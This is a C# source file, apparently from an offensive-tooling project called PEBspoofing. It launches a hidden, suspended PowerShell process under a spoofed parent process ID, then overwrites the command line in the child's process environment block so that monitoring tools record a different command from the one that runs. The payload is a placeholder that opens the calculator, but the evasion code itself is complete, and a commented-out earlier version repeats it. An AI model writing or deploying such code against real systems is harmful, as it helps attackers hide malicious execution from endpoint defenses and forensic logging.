using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using static PEBspoofing.NativeStructs;
using static PEBspoofing.NativeFunctions;

namespace PEBspoofing
{
    public class ProcessCreator
    {
        public static PROCESS_INFORMATION PROCESS_INFORMATION_instance = new PROCESS_INFORMATION();

        private static Object FindObjectAddress(IntPtr BaseAddress, Object StructObject, IntPtr Handle)
        {
            IntPtr ObjAllocMemAddr = Marshal.AllocHGlobal(Marshal.SizeOf(StructObject.GetType()));
            RtlZeroMemory(ObjAllocMemAddr, Marshal.SizeOf(StructObject.GetType()));

            uint getsize = 0;
            bool return_status = false;

            return_status = NtReadVirtualMemory(
                Handle,
                BaseAddress,
                ObjAllocMemAddr,
                (uint)Marshal.SizeOf(StructObject),
                ref getsize
             );

            StructObject = Marshal.PtrToStructure(ObjAllocMemAddr, StructObject.GetType());
            return StructObject;
        }

        public static bool CreateProcessPPID_Spoofing(int parentProcessId)
        {
            //const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
            //const int CREATE_SUSPENDED = 0x00000004;
            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
            const int SW_HIDE = 0;

            var pInfo = new PROCESS_INFORMATION();
            var sInfoEx = new STARTUPINFOEX();

            sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
            sInfoEx.StartupInfo.dwFlags = 1;
            sInfoEx.StartupInfo.wShowWindow = SW_HIDE;

            IntPtr lpValue = IntPtr.Zero;

            bool result;
            string nullstr = null;


            try
            {
                if (parentProcessId > 0)
                {
                    var lpSize = IntPtr.Zero;
                    var success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                    if (success || lpSize == IntPtr.Zero)
                    {
                        return false;
                    }

                    sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                    success = InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);
                    if (!success)
                    {
                        return false;
                    }

                    var parentHandle = OpenProcess((uint)ProcessAccessFlags.All, false, parentProcessId); ;
                    // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
                    lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(lpValue, parentHandle);

                    success = UpdateProcThreadAttribute(
                        sInfoEx.lpAttributeList,
                        0,
                        (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        lpValue,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero);
                    if (!success)
                    {
                        return false;
                    }
                }


                var pSec = new SECURITY_ATTRIBUTES();
                var tSec = new SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);
                //var lpApplicationName = Path.Combine(Environment.SystemDirectory, "notepad.exe");

                string ori_command = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe start-process calc.exe";
                result = CreateProcess(
                    nullstr,
                    ori_command,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    true,
                    CreateProcessFlags.CREATE_SUSPENDED |
                    CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT |
                    CreateProcessFlags.CREATE_NEW_CONSOLE,
                    IntPtr.Zero,
                    null,
                    ref sInfoEx,
                    out pInfo
                );

                PROCESS_INFORMATION_instance = pInfo;
                Commandline_Spoofing(parentProcessId, PROCESS_INFORMATION_instance);
                ResumeThread(pInfo.hThread);
            }
            finally
            {
                // Free the attribute list
                if (sInfoEx.lpAttributeList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                }
                Marshal.FreeHGlobal(lpValue);

                // Close process and thread handles
                if (pInfo.hProcess != IntPtr.Zero)
                {
                    CloseHandle(pInfo.hProcess);
                }
                if (pInfo.hThread != IntPtr.Zero)
                {
                    CloseHandle(pInfo.hThread);
                }
            }
            return result;

        }


        public static bool Commandline_Spoofing(int parentProcessId, PROCESS_INFORMATION PROCESS_INFORMATION_instance)
        {
            PROCESS_BASIC_INFORMATION PROCESS_BASIC_INFORMATION_instance = new PROCESS_BASIC_INFORMATION();
            IntPtr ProcessHandle = OpenProcess((uint)ProcessAccessFlags.All, false, PROCESS_INFORMATION_instance.dwProcessId);

            uint sizePtr = 0;

            UInt32 QueryResult = NtQueryInformationProcess(
                ProcessHandle, 
                0, 
                ref PROCESS_BASIC_INFORMATION_instance, 
                Marshal.SizeOf(PROCESS_BASIC_INFORMATION_instance), 
                ref sizePtr
            );

            PEB PEB_instance = new PEB();
            PEB_instance = (PEB)FindObjectAddress(
                PROCESS_BASIC_INFORMATION_instance.PebBaseAddress,
                PEB_instance,
                ProcessHandle);
           
            RTL_USER_PROCESS_PARAMETERS RTL_USER_PROCESS_PARAMETERS_instance = new RTL_USER_PROCESS_PARAMETERS();
            RTL_USER_PROCESS_PARAMETERS_instance = (RTL_USER_PROCESS_PARAMETERS)FindObjectAddress(
                PEB_instance.ProcessParameters64,
                RTL_USER_PROCESS_PARAMETERS_instance,
                ProcessHandle);

            string cmdStr = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            int cmdStr_Length = 2 * cmdStr.Length;
            int cmdStr_MaximumLength = 2 * cmdStr.Length + 2;

            IntPtr real_command_addr = IntPtr.Zero;
            real_command_addr = Marshal.StringToHGlobalUni(cmdStr);

            NTSTATUS ntstatus = new NTSTATUS();
            int OriginalCommand_length = (int)RTL_USER_PROCESS_PARAMETERS_instance.Length;
            IntPtr com_zeroAddr = Marshal.AllocHGlobal(OriginalCommand_length);
            RtlZeroMemory(com_zeroAddr, OriginalCommand_length);

            // rewrite the memory with 0x00 and then write it with real command
            ntstatus = NtWriteVirtualMemory(
                ProcessHandle, 
                RTL_USER_PROCESS_PARAMETERS_instance.CommandLine.buffer, 
                com_zeroAddr,
                RTL_USER_PROCESS_PARAMETERS_instance.Length, 
                ref sizePtr);
           
            ntstatus = NtWriteVirtualMemory(
                ProcessHandle, 
                RTL_USER_PROCESS_PARAMETERS_instance.CommandLine.buffer, 
                real_command_addr,
                (uint)cmdStr_Length, 
                ref sizePtr);



            /*
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            PEB PebBlock = new PEB();
            RTL_USER_PROCESS_PARAMETERS parameters = new RTL_USER_PROCESS_PARAMETERS();
            Boolean successEx = false;


            Int32 commandline_len = (ori_command.Length) * 2;
            IntPtr pMemLoc = Marshal.AllocHGlobal(Marshal.SizeOf(PebBlock));
            IntPtr pMemLoc2 = Marshal.AllocHGlobal(Marshal.SizeOf(parameters));
            IntPtr pMemLoc_com = Marshal.AllocHGlobal(commandline_len);
            string command_get = "";

            uint getsize = 0;
            Int32 ReadSize = 64;
            Int32 RTL_USER_PROCESS_PARAMETERS = 0x20;
            IntPtr pMemLoc3 = Marshal.AllocHGlobal(ReadSize);

            // The RtlSecureZeroMemory routine fills a block of memory with zeros in a way that is guaranteed to be secure.
            RtlZeroMemory(pMemLoc2, Marshal.SizeOf(parameters));
            RtlZeroMemory(pMemLoc3, ReadSize);
            RtlZeroMemory(pMemLoc_com, commandline_len);
            newProcessHandle = OpenProcess((uint)ProcessAccessFlags.All, false, pInfo.dwProcessId);
            UInt32 queryResult = NtQueryInformationProcess(newProcessHandle, 0, ref pbi, Marshal.SizeOf(pbi), ref sizePtr);
            IntPtr RTL_Address = (IntPtr)((pbi.PebBaseAddress).ToInt64() + RTL_USER_PROCESS_PARAMETERS)
;
            successEx = NtReadVirtualMemory(newProcessHandle, (IntPtr)(pbi.PebBaseAddress), pMemLoc, (uint)ReadSize, ref getsize);
            // Marshal.GetLastWin32Error();

            PebBlock = (PEB)Marshal.PtrToStructure(pMemLoc, typeof(PEB));
            successEx = NtReadVirtualMemory(newProcessHandle, PebBlock.ProcessParameters64, pMemLoc2, (uint)Marshal.SizeOf(parameters), ref getsize);
            parameters = (RTL_USER_PROCESS_PARAMETERS)Marshal.PtrToStructure(pMemLoc2, typeof(RTL_USER_PROCESS_PARAMETERS));


            successEx = NtReadVirtualMemory(newProcessHandle, parameters.CommandLine.buffer, pMemLoc_com, (uint)commandline_len, ref getsize);
            command_get = Marshal.PtrToStringUni(pMemLoc_com, ori_command.Length);

            Console.WriteLine("Original command：" + command_get);
            UInt64 ProcParams;
            Int32 CommandLine = 0x70;

            string cmdStr = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            short cmdStr_Length = (short)(2 * cmdStr.Length);
            short cmdStr_MaximumLength = (short)(2 * cmdStr.Length + 2);

            IntPtr cmdStr_Length_Addr = Marshal.AllocHGlobal(Marshal.SizeOf(cmdStr_Length));
            IntPtr cmdStr_MaximumLength_Addr = Marshal.AllocHGlobal(Marshal.SizeOf(cmdStr_MaximumLength));

            Marshal.WriteInt16(cmdStr_Length_Addr, cmdStr_Length);
            Marshal.WriteInt16(cmdStr_MaximumLength_Addr, cmdStr_MaximumLength);

            IntPtr real_command_addr = IntPtr.Zero;
            real_command_addr = Marshal.StringToHGlobalUni(cmdStr);

            NTSTATUS ntstatus = new NTSTATUS();
            ntstatus = NtWriteVirtualMemory(newProcessHandle, PebBlock.ProcessParameters64 + CommandLine + 0x2, cmdStr_MaximumLength_Addr, (uint)Marshal.SizeOf(cmdStr_MaximumLength), ref getsize);
            ntstatus = NtWriteVirtualMemory(newProcessHandle, PebBlock.ProcessParameters64 + CommandLine, cmdStr_Length_Addr, (uint)Marshal.SizeOf(cmdStr_Length), ref getsize);

            IntPtr com_zeroAddr = Marshal.AllocHGlobal((ori_command.Length) * 2);
            RtlZeroMemory(com_zeroAddr, (ori_command.Length) * 2);

            // rewrite the memory with 0x00 and then write it with real command
            ntstatus = NtWriteVirtualMemory(newProcessHandle, parameters.CommandLine.buffer, com_zeroAddr, (uint)(2 * (ori_command.Length)), ref getsize);
            ntstatus = NtWriteVirtualMemory(newProcessHandle, parameters.CommandLine.buffer, real_command_addr, (uint)(2 * (cmdStr.Length)), ref getsize);



            // Console.WriteLine(GetCurrentThread());
            //ResumeThread(pInfo.hProcess);
            
            */
            return true;
            

            }
         
        }


   
}
